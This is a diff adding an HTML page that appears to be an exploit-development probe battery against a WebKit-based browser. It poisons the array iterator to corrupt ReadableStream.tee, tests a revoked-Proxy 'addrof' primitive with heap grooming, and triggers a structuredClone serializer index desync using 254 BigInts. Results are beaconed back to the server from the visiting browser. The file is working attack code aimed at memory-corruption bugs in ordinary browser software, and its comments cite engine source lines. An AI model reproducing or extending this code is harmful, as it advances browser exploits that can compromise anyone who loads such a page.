@@ -1,0 +1,237 @@
+<!doctype html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-corrected-MIMO — 11-stage battery (B1-gate 255/256 + X1 readback + EveryStage Failsafe)</title>
+</head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-corrected-MIMO</pre>
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>
+(function(){
+  "use strict";
+  var run = "m6-" + Date.now().toString(36);
+  var out = document.getElementById("out");
+  function say(s){ try{ out.appendChild(document.createTextNode("\n" + s)); }catch(e){} }
+  function b(st, body){
+    try{
+      fetch("/beacon/V6M-" + st, { method:"POST", keepalive:true, cache:"no-store",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({ r: run, b: String(body).slice(0,180) })
+      }).catch(function(){});
+    }catch(e){}
+  }
+  /* ---- iterator failsafe: every poison yields EXACTLY 2 OBJECTS.
+         No under-yield, no primitive yield  => SequenceConverter result vector
+         always size 2 => *results[1].get() is never a null/garbage slot
+         (InternalReadableStream.cpp:195 is only safe on size==2).       */
+  var ITER = Array.prototype[Symbol.iterator];
+  function restore(){ try{ Array.prototype[Symbol.iterator] = ITER; }catch(e){} }
+  function iterOf(yielder){
+    return function(){
+      var i = 0, n = 2;
+      return { next: function(){
+        if (i >= n) return { done: true };
+        var v = yielder(i); i++;
+        return { value: v, done: false };
+      }};
+    };
+  }
+  function mkX(tag){
+    var X = { ourTag: tag };
+    window.__mimoX = X;
+    return iterOf(function(){ return X; });
+  }
+  function stage(id, poison, work){
+    try{
+      b(id + "A", id + " start");
+      say("V6M-" + id + " ...");
+      if (poison) { Array.prototype[Symbol.iterator] = poison(); }
+      var r;
+      try{ r = work(); }
+      finally{ restore(); }
+      b(id + "B", "SURV " + String(r).slice(0,150));
+      say("V6M-" + id + " " + r);
+      return r;
+    }catch(e){
+      restore();
+      var msg = String((e && e.message) || e).slice(0,90);
+      b(id + "E", "ETYPE: " + msg);
+      say("V6M-" + id + " E " + msg);
+      return "E:" + msg;
+    }
+  }
+  function tee(){ var rs = new ReadableStream({}); return rs.tee(); }
+
+  /* L — load + deriveRuntime typeof (DR-GAP tolerated) */
+  try{
+    b("L", "loaded; dr=" + (typeof window.deriveRuntime) + "; ua=" + navigator.userAgent.slice(0,44));
+    say("V6M-L loaded; deriveRuntime=" + (typeof window.deriveRuntime));
+  }catch(e){}
+  try{ setInterval(function(){ b("HB", "hb"); }, 2000); }catch(e){}
+
+  /* 1. C0 — UNPOISONED clean control (FA-v10 bug: C0 used the X-poison) */
+  stage("C0", null, function(){
+    var p = tee();
+    return "clean len=" + p.length + "; locked=" + p[0].locked;
+  });
+
+  /* 2. INV — pidInverted witness: same-X-twice, cancel-flip asymmetry */
+  stage("INV", function(){ return mkX("inv"); }, function(){
+    var p = tee(), f = false, s = false;
+    try{ p[0].cancel(); }catch(e){ f = true; }
+    try{ p[1].cancel(); }catch(e){ s = true; }
+    return "pidInverted=" + (f && !s) + "; locked=" + p[0].locked;
+  });
+
+  /* 3. ORA — state-oracle readback (Sol path-1/2) */
+  stage("ORA", function(){ return mkX("ora"); }, function(){
+    var p = tee();
+    return "locked=" + p[0].locked + "; gr=" + typeof p[0].getReader +
+           "; cr=" + typeof p[0].cancel + "; second-locked=" + p[1].locked;
+  });
+
+  /* 4. PX — revoked-Proxy addrof-shape (DS-PRO-MAX: best addrof candidate) */
+  stage("PX", function(){
+    var pr = Proxy.revocable({}, {}); pr.revoke();
+    return iterOf(function(){ return pr.proxy; });
+  }, function(){
+    var p = tee();
+    return "proxy-locked=" + p[0].locked + "; gr=" + typeof p[0].getReader;
+  });
+
+  /* 5. BI — BigInt-wrapper growth marker (skip cleanly if no BigInt) */
+  stage("BI", function(){
+    if (typeof BigInt === "undefined") throw new Error("BIGINT-MISSING");
+    var w = Object((BigInt(1) << BigInt(40)));
+    return iterOf(function(){ return w; });
+  }, function(){
+    var p = tee();
+    return "bi-locked=" + p[0].locked + "; gr=" + typeof p[0].getReader;
+  });
+
+  /* 6. DT — Date negative control (deputy write never touches inline fields) */
+  stage("DT", function(){
+    var d = new Date(0);
+    return iterOf(function(){ return d; });
+  }, function(){
+    var p = tee();
+    return "date-locked=" + p[0].locked + "; typeof-cancel=" + typeof p[0].cancel;
+  });
+
+  /* 7. CH — alloc/groom pressure keep-alive (256 x 16B objects, then tee) */
+  stage("CH", function(){
+    var junk = [], i;
+    for (i = 0; i < 256; i++) junk.push({ n: i });
+    window.__mimoJunk = junk;
+    return mkX("ch");
+  }, function(){
+    var p = tee();
+    return "chain-locked=" + p[0].locked + "; gr=" + typeof p[0].getReader;
+  });
+
+  /* 8. RS — sibling control: real stream SAVED for post-run analysis */
+  stage("RS", null, function(){
+    var p = tee();
+    window.__mimoReal = p[0];
+    return "realStream-locked=" + p[0].locked + "; gr=" + typeof p[0].getReader;
+  });
+
+  /* 9. TGT — seal readback (Sol 14.16: private-name write invisible as props) */
+  stage("TGT", function(){ return mkX("tgt"); }, function(){
+    var p = tee(); var X = window.__mimoX;
+    return "tgt-keys=" + Object.keys(X).join(",") + "; tgtCount=" +
+           Object.keys(X).length + "; locked=" + p[0].locked;
+  });
+
+  /* 10. X1 — WRITTEN-VALUE READ-BACK CLASSIFIER (dshx-pro A3):
+          engine wrote the private lock-state onto OUR X during the tee wrap;
+          read it back through the public state-machine and classify.
+          NO under-yield, NO results[1] touch, NO getReader pre-dispatch.   */
+  stage("X1", function(){ return mkX("x1"); }, function(){
+    var p = tee();
+    var X = window.__mimoX;
+    var st = "locked=" + p[0].locked + "; gr=" + typeof p[0].getReader +
+             "; cl=" + typeof p[0].cancel + "; xkeys=" + Object.keys(X).join(",");
+    var sig = "NONE";
+    try{
+      var resp = new Response(p[0]);
+      var cl = resp.clone();
+      sig = "CLONE-OK bodyIs=" + !!cl.body;
+    }catch(e){ sig = "E:" + String((e && e.message) || e).slice(0,60); }
+    var klass;
+    if (sig.indexOf("locked") >= 0) klass = "STATE-WRITTEN(A3-readback)";
+    else if (sig.indexOf("undefined is not an object") >= 0) klass = "STATE-NOT-PROPAGATED";
+    else if (sig.indexOf("CLONE-OK") === 0) klass = "NO-WRITTEN-STATE";
+    else klass = "UNKNOWN";
+    return st + "; sig=" + sig + "; class=" + klass;
+  });
+
+  /* 11. B1 — family-(b) ObjectReferenceTag width-desync GATE (255/256 crossing).
+          Writer:  m_objectPool = {rootArray, shared} => size 2  => 1-byte index
+                   (writeConstantPoolIndex, SerializedScriptValue.cpp:1896-1910)
+          Reader:  m_gcBuffer = rootArray + 254 BigIntTag + shared = 256
+                   => 2-byte index (readConstantPoolIndex, :2865-2883;
+                   BigIntTag -> readBigInt appends :4014/:4045/:4083;
+                   StringTag does NOT append :4247-4252 => string pads are dead)
+          ObjectReferenceTag read: :4315-4321 -> m_gcBuffer.at(*index),
+          at(int) guards ONLY i>=m_size (ArgList.h:138-149).
+          2-byte window => positive garbage index => at() returns jsUndefined
+          + shifted parse => observable DESYNC without the 4-byte negative-index
+          crash class. B1 runs LAST: it is the only crash-capable probe.      */
+  stage("B1", null, function(){
+    if (typeof BigInt === "undefined") return "SKIP no-BigInt";
+    var shared = { s: "gate" }, arr = [], i;
+    for (i = 0; i < 254; i++) arr.push((BigInt(1) << BigInt(40)) + BigInt(i));
+    arr.push(shared); arr.push(shared);
+    var c = structuredClone(arr);
+    var last = c[c.length - 1];
+    var clean = (c.length === 256) && (typeof last === "object") &&
+                last && last.s === "gate" && (c[254] === c[255]);
+    return "BUGLIVE=" + (!clean) + "; cloneLen=" + c.length +
+           "; lastType=" + typeof last + "; dedup=" + (c[254] === c[255]) +
+           "; tag=" + (last && last.s);
+  });
+
+  /* 12. S4a/S4b/S4c — trio instrumentado (dsch-v4pro postmortem 17:00). Sin at(-i) 4-byte (S4d NO aqui — crash-class). Paired con stage() de MIMO (host vivo 17:02). */
+  stage("S4a", null, function(){
+    if (typeof BigInt === "undefined") return "SKIP no-BigInt";
+    var X = { ourTag: "s4a-inv" };
+    var arr = [ ((BigInt(1) << BigInt(40)) + BigInt(39)), X, X ];
+    var c;
+    try { c = structuredClone(arr); } catch(e){ return "E-class:" + String((e&&e.message)||e).slice(0,80); }
+    var v1 = c[1], v2 = c[2];
+    var wrong = (typeof v1 !== "object") || (typeof v2 !== "object") ||
+                (v1 && v1.ourTag !== "s4a-inv") || (v2 && v2.ourTag !== "s4a-inv");
+    return "len=" + c.length + "; t1=" + typeof v1 + "; tag1=" + ((v1 && v1.ourTag) || "-") +
+           "; t2=" + typeof v2 + "; tag2=" + ((v2 && v2.ourTag) || "-") +
+           "; dedup=" + (v1 === v2) + "; BUGLIVE=" + wrong;
+  });
+  stage("S4b", null, function(){
+    var A = [], i;
+    for (i = 0; i < 254; i++) A.push("d" + i);
+    var obj = { a: A, x: "Sx", y: "Sy" };
+    var c;
+    try { c = structuredClone(obj); } catch(e){ return "E-class:" + String((e&&e.message)||e).slice(0,80); }
+    var a = c && c.a;
+    return "aType=" + typeof a + "; aLen=" + (a && a.length) + "; aLast=" + (a ? a[a.length-1] : "-") +
+           "; x=" + (c.x || "-") + "; y=" + (c.y || "-") + "; xStillSx=" + (c.x === "Sx");
+  });
+  stage("S4c", null, function(){
+    if (typeof BigInt === "undefined") return "SKIP no-BigInt";
+    var X = { ourTag: "s4c-inv" }, i, arr = [];
+    for (i = 0; i < 255; i++) arr.push((BigInt(1) << BigInt(40)) + BigInt(i));
+    arr.push(X); arr.push(X);
+    var c;
+    try { c = structuredClone(arr); } catch(e){ return "E-class:" + String((e&&e.message)||e).slice(0,80); }
+    var v255 = c[255], v256 = c[256];
+    var clean = (c.length === 257) && v255 && typeof v255 === "object" && v255.ourTag === "s4c-inv" &&
+                v256 && typeof v256 === "object" && v256.ourTag === "s4c-inv" && v255 === v256;
+    return "len=" + c.length + "; t255=" + typeof v255 + "; t256=" + typeof v256 +
+           "; tag255=" + ((v255 && v255.ourTag) || "-") + "; dedup=" + (v255 === v256) +
+           "; clean=" + clean + "; BUGLIVE=" + (!clean);
+  });
+
+  b("Z", "FA-corrected-MIMO complete");
+  say("FA-corrected-MIMO complete");
+})();
+</script>
+</body></html>
